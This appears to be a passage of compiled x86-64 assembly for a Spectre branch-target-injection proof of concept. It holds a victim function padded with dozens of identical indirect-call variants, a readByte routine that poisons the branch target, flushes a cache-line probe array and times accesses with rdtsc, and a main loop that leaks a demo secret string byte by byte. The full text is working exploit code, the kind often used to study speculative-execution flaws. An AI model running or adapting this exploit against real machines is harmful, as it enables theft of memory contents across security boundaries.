	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 183
.Lvictim_win0_var183:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 184
.Lvictim_win0_var184:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 185
.Lvictim_win0_var185:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 186
.Lvictim_win0_var186:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 187
.Lvictim_win0_var187:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 188
.Lvictim_win0_var188:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 189
.Lvictim_win0_var189:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 190
.Lvictim_win0_var190:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 191
.Lvictim_win0_var191:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 192
.Lvictim_win0_var192:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 193
.Lvictim_win0_var193:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 194
.Lvictim_win0_var194:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 195
.Lvictim_win0_var195:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 196
.Lvictim_win0_var196:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 197
.Lvictim_win0_var197:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 198
.Lvictim_win0_var198:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 199
.Lvictim_win0_var199:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 200
.Lvictim_win0_var200:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 201
.Lvictim_win0_var201:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 202
.Lvictim_win0_var202:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 203
.Lvictim_win0_var203:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 204
.Lvictim_win0_var204:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 205
.Lvictim_win0_var205:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 206
.Lvictim_win0_var206:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 207
.Lvictim_win0_var207:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 208
.Lvictim_win0_var208:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 209
.Lvictim_win0_var209:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 210
.Lvictim_win0_var210:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 211
.Lvictim_win0_var211:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 212
.Lvictim_win0_var212:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 213
.Lvictim_win0_var213:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 214
.Lvictim_win0_var214:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 215
.Lvictim_win0_var215:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 216
.Lvictim_win0_var216:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 217
.Lvictim_win0_var217:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 218
.Lvictim_win0_var218:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 219
.Lvictim_win0_var219:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 220
.Lvictim_win0_var220:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 221
.Lvictim_win0_var221:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 222
.Lvictim_win0_var222:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 223
.Lvictim_win0_var223:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 224
.Lvictim_win0_var224:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 225
.Lvictim_win0_var225:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 226
.Lvictim_win0_var226:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 227
.Lvictim_win0_var227:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 228
.Lvictim_win0_var228:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 229
.Lvictim_win0_var229:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 230
.Lvictim_win0_var230:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 231
.Lvictim_win0_var231:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 232
.Lvictim_win0_var232:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 233
.Lvictim_win0_var233:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 234
.Lvictim_win0_var234:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 235
.Lvictim_win0_var235:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 236
.Lvictim_win0_var236:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 237
.Lvictim_win0_var237:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 238
.Lvictim_win0_var238:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 239
.Lvictim_win0_var239:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 240
.Lvictim_win0_var240:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 241
.Lvictim_win0_var241:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 242
.Lvictim_win0_var242:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 243
.Lvictim_win0_var243:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 244
.Lvictim_win0_var244:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 245
.Lvictim_win0_var245:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 246
.Lvictim_win0_var246:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 247
.Lvictim_win0_var247:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 248
.Lvictim_win0_var248:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 249
.Lvictim_win0_var249:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
.Lvictim_win0_continue:
	movl	%eax, %ebx
	## InlineAsm End
	movl	%ebx, -36(%rbp)    # # 4-byte Spill
	movl	-36(%rbp), %eax    # # 4-byte Reload
	movl	%eax, -32(%rbp)
	movl	-32(%rbp), %eax
	andl	-24(%rbp), %eax
	popq	%rbx
	popq	%rbp
	retq
	.cfi_endproc
                                        ## -- End function
	.globl	_readByte                       ## -- Begin function readByte
	.p2align	4, 0x90
_readByte:
	.cfi_startproc
## %bb.0:
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset %rbp, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register %rbp
	subq	$1120, %rsp    # # imm = 0x460
	movq	___stack_chk_guard@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	%rax, -8(%rbp)
	movq	%rdi, -1048(%rbp)
	movq	%rsi, -1056(%rbp)
	movq	%rdx, -1064(%rbp)
	movl	$0, -1088(%rbp)
	movb	$36, -1113(%rbp)
	movl	$0, -1072(%rbp)
LBB3_1:                                 ## =>This Inner Loop Header: Depth=1
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_4
## %bb.2:                               ##   in Loop: Header=BB3_1 Depth=1
	movslq	-1072(%rbp), %rax
	movl	$0, -1040(%rbp,%rax,4)
	movl	-1072(%rbp), %eax
	shll	$10, %eax
	movslq	%eax, %rcx
	movq	_channel@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB3_1 Depth=1
	movl	-1072(%rbp), %eax
	addl	$1, %eax
	movl	%eax, -1072(%rbp)
	jmp	LBB3_1
LBB3_4:
	movl	$999, -1068(%rbp)    # # imm = 0x3E7
LBB3_5:                                 ## =>This Loop Header: Depth=1
                                        ##     Child Loop BB3_7 Depth 2
                                        ##     Child Loop BB3_11 Depth 2
                                        ##     Child Loop BB3_15 Depth 2
                                        ##     Child Loop BB3_21 Depth 2
	cmpl	$0, -1068(%rbp)
	jle	LBB3_37
## %bb.6:                               ##   in Loop: Header=BB3_5 Depth=1
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	leaq	_gadget(%rip), %rcx
	movq	%rcx, (%rax)
	mfence
	movl	$29, -1076(%rbp)
LBB3_7:                                 ##   Parent Loop BB3_5 Depth=1
                                        ## =>  This Inner Loop Header: Depth=2
	cmpl	$0, -1076(%rbp)
	jle	LBB3_10
## %bb.8:                               ##   in Loop: Header=BB3_7 Depth=2
	leaq	-1113(%rbp), %rdi
	xorl	%esi, %esi
	callq	_victim
	xorl	-1088(%rbp), %eax
	movl	%eax, -1088(%rbp)
## %bb.9:                               ##   in Loop: Header=BB3_7 Depth=2
	movl	-1076(%rbp), %eax
	addl	$-1, %eax
	movl	%eax, -1076(%rbp)
	jmp	LBB3_7
LBB3_10:                                ##   in Loop: Header=BB3_5 Depth=1
	mfence
	movl	$0, -1072(%rbp)
LBB3_11:                                ##   Parent Loop BB3_5 Depth=1
                                        ## =>  This Inner Loop Header: Depth=2
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_14
## %bb.12:                              ##   in Loop: Header=BB3_11 Depth=2
	movl	-1072(%rbp), %eax
	shll	$10, %eax
	movslq	%eax, %rcx
	movq	_channel@GOTPCREL(%rip), %rax
	addq	%rcx, %rax
	clflush	(%rax)
## %bb.13:                              ##   in Loop: Header=BB3_11 Depth=2
	movl	-1072(%rbp), %eax
	addl	$1, %eax
	movl	%eax, -1072(%rbp)
	jmp	LBB3_11
LBB3_14:                                ##   in Loop: Header=BB3_5 Depth=1
	mfence
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	leaq	_safe_target(%rip), %rcx
	movq	%rcx, (%rax)
	mfence
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	clflush	(%rax)
	mfence
	movq	-1048(%rbp), %rdi
	xorl	%esi, %esi
	callq	_victim
	xorl	-1088(%rbp), %eax
	movl	%eax, -1088(%rbp)
	mfence
	movl	$0, -1072(%rbp)
LBB3_15:                                ##   Parent Loop BB3_5 Depth=1
                                        ## =>  This Inner Loop Header: Depth=2
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_20
## %bb.16:                              ##   in Loop: Header=BB3_15 Depth=2
	imull	$167, -1072(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -1084(%rbp)
	movl	-1084(%rbp), %eax
	shll	$10, %eax
	movslq	%eax, %rcx
	movq	_channel@GOTPCREL(%rip), %rax
	addq	%rcx, %rax
	movq	%rax, -1112(%rbp)
	rdtsc
	shlq	$32, %rdx
	orq	%rdx, %rax
	movq	%rax, -1096(%rbp)
	movq	-1112(%rbp), %rax
	movzbl	(%rax), %eax
	xorl	-1088(%rbp), %eax
	movl	%eax, -1088(%rbp)
	mfence
	rdtsc
	shlq	$32, %rdx
	orq	%rdx, %rax
	subq	-1096(%rbp), %rax
	movq	%rax, -1104(%rbp)
	cmpq	$80, -1104(%rbp)
	ja	LBB3_18
## %bb.17:                              ##   in Loop: Header=BB3_15 Depth=2
	movslq	-1084(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	addl	$1, %ecx
	movl	%ecx, -1040(%rbp,%rax,4)
LBB3_18:                                ##   in Loop: Header=BB3_15 Depth=2
	jmp	LBB3_19
LBB3_19:                                ##   in Loop: Header=BB3_15 Depth=2
	movl	-1072(%rbp), %eax
	addl	$1, %eax
	movl	%eax, -1072(%rbp)
	jmp	LBB3_15
LBB3_20:                                ##   in Loop: Header=BB3_5 Depth=1
	movl	$-1, -1080(%rbp)
	movl	$-1, -1076(%rbp)
	movl	$0, -1072(%rbp)
LBB3_21:                                ##   Parent Loop BB3_5 Depth=1
                                        ## =>  This Inner Loop Header: Depth=2
	cmpl	$256, -1072(%rbp)    # # imm = 0x100
	jge	LBB3_31
## %bb.22:                              ##   in Loop: Header=BB3_21 Depth=2
	cmpl	$0, -1076(%rbp)
	jl	LBB3_24
## %bb.23:                              ##   in Loop: Header=BB3_21 Depth=2
	movslq	-1072(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	movslq	-1076(%rbp), %rcx
	cmpl	-1040(%rbp,%rcx,4), %eax
	jl	LBB3_25
LBB3_24:                                ##   in Loop: Header=BB3_21 Depth=2
	movl	-1076(%rbp), %eax
	movl	%eax, -1080(%rbp)
	movl	-1072(%rbp), %eax
	movl	%eax, -1076(%rbp)
	jmp	LBB3_29
LBB3_25:                                ##   in Loop: Header=BB3_21 Depth=2
	cmpl	$0, -1080(%rbp)
	jl	LBB3_27
## %bb.26:                              ##   in Loop: Header=BB3_21 Depth=2
	movslq	-1072(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	movslq	-1080(%rbp), %rcx
	cmpl	-1040(%rbp,%rcx,4), %eax
	jl	LBB3_28
LBB3_27:                                ##   in Loop: Header=BB3_21 Depth=2
	movl	-1072(%rbp), %eax
	movl	%eax, -1080(%rbp)
LBB3_28:                                ##   in Loop: Header=BB3_21 Depth=2
	jmp	LBB3_29
LBB3_29:                                ##   in Loop: Header=BB3_21 Depth=2
	jmp	LBB3_30
LBB3_30:                                ##   in Loop: Header=BB3_21 Depth=2
	movl	-1072(%rbp), %eax
	addl	$1, %eax
	movl	%eax, -1072(%rbp)
	jmp	LBB3_21
LBB3_31:                                ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1076(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %eax
	movslq	-1080(%rbp), %rcx
	movl	-1040(%rbp,%rcx,4), %ecx
	shll	%ecx
	addl	$5, %ecx
	cmpl	%ecx, %eax
	jge	LBB3_34
## %bb.32:                              ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1076(%rbp), %rax
	cmpl	$2, -1040(%rbp,%rax,4)
	jne	LBB3_35
## %bb.33:                              ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1080(%rbp), %rax
	cmpl	$0, -1040(%rbp,%rax,4)
	jne	LBB3_35
LBB3_34:
	jmp	LBB3_37
LBB3_35:                                ##   in Loop: Header=BB3_5 Depth=1
	jmp	LBB3_36
LBB3_36:                                ##   in Loop: Header=BB3_5 Depth=1
	movl	-1068(%rbp), %eax
	addl	$-1, %eax
	movl	%eax, -1068(%rbp)
	jmp	LBB3_5
LBB3_37:
	movl	-1088(%rbp), %eax
	xorl	-1040(%rbp), %eax
	movl	%eax, -1040(%rbp)
	movl	-1076(%rbp), %eax
	movb	%al, %cl
	movq	-1056(%rbp), %rax
	movb	%cl, (%rax)
	movslq	-1076(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	movq	-1064(%rbp), %rax
	movl	%ecx, (%rax)
	movl	-1080(%rbp), %eax
	movb	%al, %cl
	movq	-1056(%rbp), %rax
	movb	%cl, 1(%rax)
	movslq	-1080(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	movq	-1064(%rbp), %rax
	movl	%ecx, 4(%rax)
	movq	___stack_chk_guard@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	-8(%rbp), %rcx
	cmpq	%rcx, %rax
	jne	LBB3_39
## %bb.38:
	addq	$1120, %rsp    # # imm = 0x460
	popq	%rbp
	retq
LBB3_39:
	callq	___stack_chk_fail
	.cfi_endproc
                                        ## -- End function
	.globl	_main                           ## -- Begin function main
	.p2align	4, 0x90
_main:
	.cfi_startproc
## %bb.0:
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset %rbp, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register %rbp
	subq	$64, %rsp
	movq	___stack_chk_guard@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	%rax, -8(%rbp)
	movl	$0, -20(%rbp)
	movl	%edi, -24(%rbp)
	movq	%rsi, -32(%rbp)
	movl	$8, %edi
	callq	_malloc
	movq	%rax, %rcx
	movq	_target@GOTPCREL(%rip), %rax
	movq	%rcx, (%rax)
	movq	_secret(%rip), %rdi
	callq	_strlen
                                        ## kill: def $eax killed $eax killed $rax
	movl	%eax, -40(%rbp)
	movq	_secret(%rip), %rax
	movq	%rax, -48(%rbp)
	cmpl	$3, -24(%rbp)
	jne	LBB4_2
## %bb.1:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-48(%rbp), %rdx
	movb	$0, %al
	callq	_sscanf
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-40(%rbp), %rdx
	movb	$0, %al
	callq	_sscanf
LBB4_2:
	movl	-40(%rbp), %esi
	movq	-48(%rbp), %rdx
	leaq	L_.str.3(%rip), %rdi
	movb	$0, %al
	callq	_printf
LBB4_3:                                 ## =>This Inner Loop Header: Depth=1
	movl	-40(%rbp), %eax
	addl	$-1, %eax
	movl	%eax, -40(%rbp)
	cmpl	$0, %eax
	jl	LBB4_9
## %bb.4:                               ##   in Loop: Header=BB4_3 Depth=1
	movq	-48(%rbp), %rsi
	leaq	L_.str.4(%rip), %rdi
	movb	$0, %al
	callq	_printf
	movq	-48(%rbp), %rdi
	movq	%rdi, %rax
	addq	$1, %rax
	movq	%rax, -48(%rbp)
	leaq	-34(%rbp), %rsi
	leaq	-16(%rbp), %rdx
	callq	_readByte
	movl	-16(%rbp), %ecx
	movl	-12(%rbp), %edx
	shll	%edx
	leaq	L_.str.7(%rip), %rsi
	leaq	L_.str.6(%rip), %rax
	cmpl	%edx, %ecx
	cmovgeq	%rax, %rsi
	leaq	L_.str.5(%rip), %rdi
	movb	$0, %al
	callq	_printf
	movsbl	-34(%rbp), %eax
	movl	%eax, -52(%rbp)    # # 4-byte Spill
	movsbl	-34(%rbp), %eax
	cmpl	$31, %eax
	jle	LBB4_7
## %bb.5:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	cmpl	$127, %eax
	jge	LBB4_7
## %bb.6:                               ##   in Loop: Header=BB4_3 Depth=1
	movsbl	-34(%rbp), %eax
	movl	%eax, -56(%rbp)    # # 4-byte Spill
	jmp	LBB4_8
LBB4_7:                                 ##   in Loop: Header=BB4_3 Depth=1
	movl	$63, %eax
	movl	%eax, -56(%rbp)    # # 4-byte Spill
	jmp	LBB4_8
LBB4_8:                                 ##   in Loop: Header=BB4_3 Depth=1
	movl	-52(%rbp), %esi    # # 4-byte Reload
	movl	-56(%rbp), %edx    # # 4-byte Reload
	leaq	L_.str.8(%rip), %rdi
	movb	$0, %al
	callq	_printf
	jmp	LBB4_3
LBB4_9:
	leaq	L_.str.9(%rip), %rdi
	movb	$0, %al
	callq	_printf
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rdi
	callq	_free
	movq	___stack_chk_guard@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	-8(%rbp), %rcx
	cmpq	%rcx, %rax
	jne	LBB4_11
## %bb.10:
	xorl	%eax, %eax
	addq	$64, %rsp
	popq	%rbp
	retq
LBB4_11:
	callq	___stack_chk_fail
	.cfi_endproc
                                        ## -- End function
	.section	__TEXT,__cstring,cstring_literals
L_.str:                                 ## @.str
	.asciz	"The Magic Words are Squeamish Ossifrage."
	.section	__DATA,__data
	.globl	_secret                         ## @secret
	.p2align	3, 0x0
_secret:
	.quad	L_.str
	.comm	_channel,262144,4               ## @channel
	.comm	_target,8,3                     ## @target
	.section	__TEXT,__cstring,cstring_literals
	L_.str.1	:    # # @.str.1
	.asciz	"%p"
	L_.str.2	:    # # @.str.2
	.asciz	"%d"
	L_.str.3	:    # # @.str.3
	.asciz	"Reading %d bytes starting at %p:\n"
	L_.str.4	:    # # @.str.4
	.asciz	"reading %p..."
	L_.str.5	:    # # @.str.5
	.asciz	"%s: "
	L_.str.6	:    # # @.str.6
	.asciz	"success"
	L_.str.7	:    # # @.str.7
	.asciz	"unclear"
	L_.str.8	:    # # @.str.8
	.asciz	"0x%02X='%c'\n"
